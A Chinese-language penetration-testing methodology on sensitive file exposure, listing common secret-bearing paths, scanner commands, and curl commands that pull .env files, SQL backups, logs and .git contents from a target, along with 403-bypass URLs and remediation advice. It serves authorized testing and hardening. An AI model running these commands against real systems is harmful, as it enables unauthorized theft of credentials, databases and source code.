# 敏感文件泄露方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的敏感文件泄露检测和利用流程。

## 1.2 适用范围

本文档适用于所有可能存在敏感文件暴露的 Web 应用和服务器。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

敏感文件泄露是指由于配置错误或疏忽，导致敏感文件（如配置文件、备份文件、日志文件等）可以被未授权访问。

**本质问题**：
- 敏感文件存储在 Web 根目录
- 文件访问控制缺失
- 备份文件未及时清理

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-538 | 文件和目录信息暴露 |
| CWE-200 | 敏感信息暴露 |
| CWE-530 | 敏感文件暴露 |

## 2.2 常见敏感文件类型

| 文件类型 | 示例 | 风险 |
|---------|------|------|
| 配置文件 | .env, config.php, web.config | 数据库凭证、API 密钥 |
| 备份文件 | .bak, .old, .sql, .tar.gz | 源码、数据库内容 |
| 日志文件 | .log, access.log | 访问记录、敏感数据 |
| 版本控制 | .git/, .svn/ | 完整源码历史 |
| 临时文件 | .tmp, .swp | 编辑中的敏感内容 |
| 编辑器配置 | .editorconfig, .vscode/ | 项目结构信息 |

## 2.3 漏洞发现方法

### 2.3.1 自动化扫描

```bash
# 使用 Dirsearch 扫描
dirsearch -u https://target.com \
    -e php,html,txt,sql,bak,old,log,git \
    --exclude-extensions gif,jpg,png

# 使用 Gobuster
gobuster dir -u https://target.com \
    -w sensitive-files.txt

# 使用 Nuclei
nuclei -t http/exposures -u https://target.com
```

### 2.3.2 常见敏感文件路径

```
# 配置文件
/.env
/.env.local
/.env.production
/config.php
/config/config.php
/app/config/parameters.yml
/web.config
/application.ini

# 备份文件
/backup.sql
/database.sql
/db.sql
/config.php.bak
/config.php.old
/site.tar.gz
/backup.zip

# 日志文件
/logs/access.log
/logs/error.log
/var/log/app.log

# 版本控制
/.git/config
/.git/HEAD
/.svn/entries
```

### 2.3.3 响应分析

```bash
# 检查响应状态码
# 200 OK - 文件存在
# 403 Forbidden - 文件存在但受保护
# 404 Not Found - 文件不存在

# 检查响应内容
# 配置文件通常包含键值对
# SQL 文件包含 CREATE/INSERT 语句
# 日志文件包含时间戳和请求信息
```

## 2.4 漏洞利用方法

### 2.4.1 配置文件利用

```bash
# 下载并分析 .env 文件
curl https://target.com/.env -o env.txt

# 可能包含：
DB_HOST=localhost
DB_DATABASE=app
DB_USERNAME=root
DB_PASSWORD=secret123
API_KEY=sk-xxxxx
AWS_SECRET_ACCESS_KEY=xxxxx
```

### 2.4.2 备份文件利用

```bash
# 下载 SQL 备份
curl https://target.com/backup.sql -o backup.sql

# 分析内容：
# 1. 查看表结构
# 2. 提取管理员账户
# 3. 查找用户数据

# 下载源码备份
curl https://target.com/site.tar.gz -o site.tar.gz
tar -xzf site.tar.gz
# 审计源码漏洞
```

### 2.4.3 Git 源码恢复

```bash
# 使用 GitHack 恢复源码
git clone https://github.com/lijiejie/GitHack
python GitHack.py https://target.com/.git/

# 恢复后：
# 1. 查看提交历史
# 2. 查找已删除的敏感代码
# 3. 审计所有版本
```

### 2.4.4 日志文件利用

```bash
# 下载日志文件
curl https://target.com/logs/access.log -o access.log

# 分析内容：
# 1. 了解系统架构（URL 结构）
# 2. 发现管理员活动
# 3. 查找敏感请求（含 Token 的 URL）
```

## 2.5 漏洞利用绕过方法

### 2.5.1 访问控制绕过

```bash
# 如果文件返回 403
# 尝试：
# - URL 编码
# - 路径遍历
# - HTTP 方法绕过

curl https://target.com/%2eenv
curl https://target.com/..;/config.php
```

### 2.5.2 隐藏文件发现

```bash
# 使用特殊字典
# - 常见编辑器临时文件
# - IDE 配置文件
# - 系统隐藏文件

.DS_Store
Thumbs.db
.idea/
.vscode/
```

---

# 第三部分：附录

## 3.1 敏感文件测试检查清单

```
□ 扫描常见配置文件
□ 扫描备份文件
□ 扫描日志文件
□ 检查版本控制目录
□ 检查临时文件
□ 测试访问控制绕过
□ 分析发现的文件
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| Dirsearch | 文件扫描 | https://github.com/maurosoria/dirsearch |
| GitHack | Git 源码恢复 | https://github.com/lijiejie/GitHack |
| Nuclei | 漏洞扫描 | https://github.com/projectdiscovery/nuclei |
| TruffleHog | 密钥检测 | https://github.com/dxa4481/truffleHog |

## 3.3 修复建议

1. **移除敏感文件** - 从 Web 根目录删除
2. **访问控制** - 限制敏感文件访问
3. **使用 .gitignore** - 防止敏感文件提交
4. **定期审计** - 检查文件暴露情况

---

**参考资源**：
- [OWASP Testing Guide - File Enumeration](https://owasp.org/www-project-web-security-testing-guide/)
- [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings)
